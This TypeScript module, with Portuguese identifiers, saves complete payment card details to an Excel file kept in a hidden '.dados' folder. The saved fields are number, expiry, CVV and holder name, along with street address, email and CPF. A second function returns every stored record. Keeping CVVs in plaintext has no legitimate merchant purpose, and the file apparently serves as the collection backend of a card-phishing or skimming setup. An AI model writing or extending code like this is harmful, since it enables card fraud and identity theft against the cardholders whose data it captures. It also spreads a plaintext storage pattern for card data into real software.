import * as fs from "fs";
import * as path from "path";
import * as XLSX from "xlsx";

const dataDir = path.join(process.cwd(), ".dados");
const excelFile = path.join(dataDir, "cartoes.xlsx");

function ensureDir() {
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
}

function initExcelFile() {
  ensureDir();
  if (!fs.existsSync(excelFile)) {
    const headers = [
      "Data/Hora",
      "Nome no Cartão",
      "Número do Cartão",
      "Validade",
      "CVV",
      "CEP",
      "Rua",
      "Número",
      "Complemento",
      "Bairro",
      "Cidade",
      "Estado",
      "Email",
      "CPF",
    ];
    const ws = XLSX.utils.aoa_to_sheet([headers]);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "Cartões");
    XLSX.writeFile(wb, excelFile);
  }
}

export function salvarCartaoExcel(dados: any) {
  try {
    ensureDir();
    initExcelFile();

    const wb = XLSX.readFile(excelFile);
    const ws = wb.Sheets["Cartões"];
    const rows = XLSX.utils.sheet_to_json(ws, { header: 1 }) as any[];

    const novaLinha = [
      new Date().toLocaleString("pt-BR"),
      dados.nome || "",
      dados.numero || "",
      dados.validade || "",
      dados.cvv || "",
      dados.cep || "",
      dados.rua || "",
      dados.numero_endereco || "",
      dados.complemento || "",
      dados.bairro || "",
      dados.cidade || "",
      dados.estado || "",
      dados.email || "",
      dados.cpf || "",
    ];

    rows.push(novaLinha);

    const wsNew = XLSX.utils.aoa_to_sheet(rows);
    wb.Sheets["Cartões"] = wsNew;
    XLSX.writeFile(wb, excelFile);

    console.log(`[excel] Dados salvos. Total de linhas: ${rows.length}`);
  } catch (err) {
    console.error("[excel] Erro ao salvar:", err);
  }
}

export function obterCartoes(): any[] {
  try {
    if (fs.existsSync(excelFile)) {
      const wb = XLSX.readFile(excelFile);
      const ws = wb.Sheets["Cartões"];
      return XLSX.utils.sheet_to_json(ws);
    }
  } catch (err) {
    console.error("[excel] Erro ao ler:", err);
  }
  return [];
}
